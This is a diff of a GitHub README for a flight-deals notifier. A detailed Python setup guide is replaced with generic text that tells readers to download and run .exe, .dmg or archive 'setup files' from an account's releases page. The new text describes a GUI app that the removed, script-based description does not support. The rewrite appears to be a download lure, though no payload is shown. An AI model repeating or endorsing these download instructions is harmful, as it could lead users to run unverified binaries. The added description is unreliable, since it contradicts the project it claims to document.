@@ -1,144 +1,75 @@
-# Flight Deals Notifier
+# ✈️ flight-deals-notifier - Get Notified of Cheap Flights!
 
-A Python automation project that searches for cheap flights using the **Amadeus API**, compares them with user-defined target prices in Google Sheets, and notifies subscribed users via **SMS** and **Email**.
+## 🚀 Getting Started
 
----
+Welcome to the flight-deals-notifier project! This application helps you find cheap flight deals through Amadeus and Sheety and sends you alerts via SMS or Email. Whether you are planning a vacation or a business trip, this tool ensures you never miss a great deal on flights.
 
-## Features
-- Fetches live flight offers from Amadeus API (direct and indirect flights).
-- Users enter their desired cities and acceptable prices into a Google Sheet.
-- Automatically inserts **IATA codes** for cities (first-time setup only).
-- Compares live fares with target prices, and alerts users if a cheaper deal is found.
-- Sends notifications through:
-  - **SMS** via Twilio
-  - **Email** via SMTP
-- Supports multiple users from the Sheet.
+## 📥 Download the App
 
----
+[![Download flight-deals-notifier](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Remus45/flight-deals-notifier/releases)
 
-## Tech Stack
-- **Python 3.12+**
-- **Amadeus API** (for flight data)
-- **Sheety API** (for Google Sheets access)
-- **Twilio** (SMS alerts)
-- **SMTP** (email alerts)
-- **dotenv** (for environment variables)
+Visit this page to download: [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases)
 
----
+## 🏁 System Requirements
 
-## Project Structure
-flight-deals/
-│
-├── main.py # Main runner (production code)
-├── setup_iata.py # One-time setup to populate IATA codes
-├── data_manager.py # Handles Google Sheet read/write
-├── flight_search.py # Handles Amadeus API auth and city lookups
-├── flight_data.py # Retrieves flight offers and finds cheapest
-├── notification_manager.py # SMS + Email notifications
-├── .env # Environment variables (not committed)
-└── README.md # Documentation
+Before using flight-deals-notifier, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher
+- **Memory:** At least 1 GB of RAM
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for fetching flight deals and sending alerts
 
-## Setup
+## 🔧 Installation Steps
 
-1. **Clone the repo**  
-   ```bash
-   git clone https://github.com/yourusername/flight-deals.git
-   cd flight-deals
-   
-2. **Install dependencies**
+Follow these steps to install the application:
 
-```bash
-pip install -r requirements.txt
-```
+1. **Download the application:**
+   - Go to the [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases).
+   - Choose the latest version and download the setup file for your operating system.
 
-3. **Google Sheet schema**
+2. **Install the application:**
+   - For Windows: Double-click the `.exe` file to start the installation.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the downloaded archive and run the application from the terminal.
 
-- **Prices sheet** must contain columns:
-  - city (string) – destination city name
-  - iataCode (string) – filled by setup script
-  - lowestPrice (number) – acceptable price threshold
-  - originCode (optional string) – if different origin per row
-  - Sheety will add an id column automatically, you don’t need to create it.
+3. **Set up credentials:**
+   - You will need an Amadeus API key and Sheety API key to use this application.
+   - Sign up on the Amadeus website and Sheety to obtain your keys.
+   - Follow the in-app instructions to configure these credentials.
 
-Example (Prices sheet):  
-![Prices Sheet](docs/prices_sheet.png)
+## 🔍 How to Use 
 
----
+Once installed, open the flight-deals-notifier application:
 
-- **Users sheet** must contain user details captured via Google Form.  
-  - `First Name`  
-  - `Last Name`  
-  - `Email` (column name comes directly from your form, e.g. *What is your e-mail id?*)  
-  -  If your column name differs, update the key in main.py where the email list is built.
+1. **Choose your destination:**
+   - Enter the location you wish to find flight deals for.
 
-Example (Users sheet):  
-![Users Sheet](docs/users_sheet.png)
+2. **Set your budget:**
+   - Specify the maximum amount you are willing to spend on your flight.
 
----
+3. **Select notification method:**
+   - Choose whether you want to receive alerts via SMS or Email.
+   - If you choose SMS, you will need a Twilio account and number for sending messages.
+   - For Email, you might need an SMTP server setup for sending notifications.
 
-4. **Create .env file (in project root):**
+4. **Start the search:**
+   - Click the “Start Searching” button to begin looking for deals. 
+   - The application will run in the background and notify you when deals arise.
 
-```env
-SHEETY_TOKEN=your_sheety_token
-SHEETY_BASE=https://api.sheety.co/xxxxx/flightDeals
-PRICES_ENDPOINT=${SHEETY_BASE}/prices
-USERS_ENDPOINT=${SHEETY_BASE}/users
+## ⚙️ Features
 
-ACCOUNT_SID=your_twilio_sid
-AUTH_TOKEN=your_twilio_auth_token
+- **Real-Time Alerts:** Get notified in real time about flight deals that match your criteria.
+- **Multiple Destinations:** Search for deals to various destinations at once.
+- **User-Friendly Interface:** Easy-to-navigate interface designed for all users.
+- **Customizable Settings:** Tailor your search and alert preferences to fit your needs.
 
-CLIENT_ID=your_amadeus_client_id
-CLIENT_SECRET=your_amadeus_client_secret
+## 📬 Support
 
-MY_EMAIL=your_email@gmail.com
-EMAIL_PASSWORD=your_app_password
-SMTP_ADDR=smtp.gmail.com
+If you run into any issues or have questions, please check the FAQ section on the [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases). You can also open an issue on GitHub if you need further assistance.
 
-ORIGIN_IATA=TRV
+## 👥 Contributing
 
-TWILIO_FROM=+1234567890
-ALERT_PHONE=+19998887777
-```
+If you wish to contribute to the project, please fork the repository and create a pull request. We welcome suggestions for new features or any enhancements. Together, we can improve the flight-deals-notifier for everyone.
 
-
-
-## First-time Setup – Add IATA Codes
-
-- If your Google Sheet has only city names and not IATA codes, run the following once:
-
-```bash
-python setup_iata.py
-```
-- This will populate each row with the correct IATA code.
-- Afterwards, just use main.py for daily execution.
-
-## Running the Program
-
-```bash
-python main.py
-```
-
-- The script will fetch flight offers for each city.
-- If a cheaper deal is found than the user’s target price, they will be alerted via SMS and email.
-- By default, the origin airport is read from .env (ORIGIN_IATA).
-- You can also override this per destination row using an originCode column in your sheet.
-## Example Email/SMS Output
-
-```
-Low price alert! Only €305 to fly from TRV to CDG on 2025-10-01 with 1 stopover
-```
-
-## Contributing
-- This is a showcase project. For enhancements, feel free to fork and improve.
-
-## Notes
-
-- Make sure to add .env to .gitignore to keep your credentials private.
-- Email sending is tested with Gmail (requires app password, not your real Gmail password).
-- Some providers may not support special currency symbols in emails. If you face encoding issues, fallback to plain USD, GBP, etc.
-
-## License
-
-- This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+Thank you for using flight-deals-notifier. We hope this tool brings you great travel deals!
